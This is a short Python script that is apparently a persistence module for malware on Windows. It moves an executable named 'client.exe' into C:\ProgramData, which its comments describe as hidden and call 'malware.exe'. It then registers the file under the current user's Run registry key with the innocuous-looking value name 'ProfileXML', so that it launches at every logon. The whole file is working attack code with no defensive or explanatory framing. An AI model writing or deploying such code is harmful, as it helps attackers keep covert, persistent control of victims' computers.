import winreg as reg
import os
import shutil


def add_to_startup(executable_path):
    # Registry key we want to access
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

    # The name of the key we will create
    value_name = "ProfileXML"

    try:
        # Open the key and allow for key creation
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_WRITE)

        # Add our executable
        reg.SetValueEx(key, value_name, 0, reg.REG_SZ, executable_path)

        # Close the key
        reg.CloseKey(key)

        print(f"Successfully added {executable_path} to {key_path}.")
    except Exception as e:
        print(f"Failed to add to startup: {e}")


def find_path():
    # Name of your executable
    executable_name = 'client.exe'
    # name of directory you want to move .exe to, be hidden
    target_directory = r'C:\ProgramData'
    # get current directory
    current_directory = os.getcwd()
    # Full path to the executable
    source_path_executable = os.path.join(current_directory, executable_name)
    source_path_log = os.path.join(current_directory)
    # moves the malware.exe to another hidden folder
    shutil.move(source_path_executable, target_directory)
    # joins the name of new directory and .exe file name
    executable_path = os.path.join(target_directory, executable_name)
    # adds the file to start up register
    add_to_startup(executable_path)
    # for testing
    print(source_path_executable)
    print(executable_path)


find_path()
